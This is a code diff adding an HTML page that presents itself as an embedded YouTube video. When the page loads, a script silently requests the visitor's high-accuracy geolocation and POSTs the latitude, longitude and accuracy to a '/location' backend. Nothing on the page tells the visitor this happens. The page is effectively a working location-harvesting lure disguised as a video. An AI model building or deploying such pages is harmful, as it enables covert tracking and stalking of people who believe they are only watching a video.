@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>YouTube Fullscreen + Location</title>
+  <style>
+    html, body { margin: 0; padding: 0; height: 100%; overflow: hidden; }
+    /* iframe { width: 100vw; height: 100vh; border: none; } */
+  </style>
+</head>
+<body>
+  <!-- Replace VIDEO_ID with real YouTube ID -->
+  <!-- <iframe src="https://www.youtube.com/embed/II2EO3Nw4m0?autoplay=1&mute=1&controls=0&showinfo=0&loop=1&playlist=VIDEO_ID"></iframe> -->
+  <!-- <iframe width="560" height="315" src="https://www.youtube.com/embed/II2EO3Nw4m0?si=9BaGNUy8-hZMkWA9" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe> -->
+  <iframe width="560" height="315" src="https://www.youtube.com/embed/YZAFd9o3RYQ?si=VxpMZck8rrJSAGYT" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+  <script>
+    async function sendLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          async (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const accuracy = pos.coords.accuracy; // in meters
+  
+            console.log("📍 Latitude:", lat);
+            console.log("📍 Longitude:", lon);
+            console.log("🎯 Accuracy:", accuracy + " meters");
+  
+            // Send to backend
+            await fetch("/location", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ latitude: lat, longitude: lon ,accuracy:accuracy}),
+            });
+          },
+          (err) => {
+            console.error("❌ Error getting location:", err.message);
+          },
+          {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0,
+          }
+        );
+      } else {
+        alert("🚫 Geolocation not supported");
+      }
+    }
+  
+    window.onload = sendLocation;
+  </script>
+  
+
+</body>
+</html>
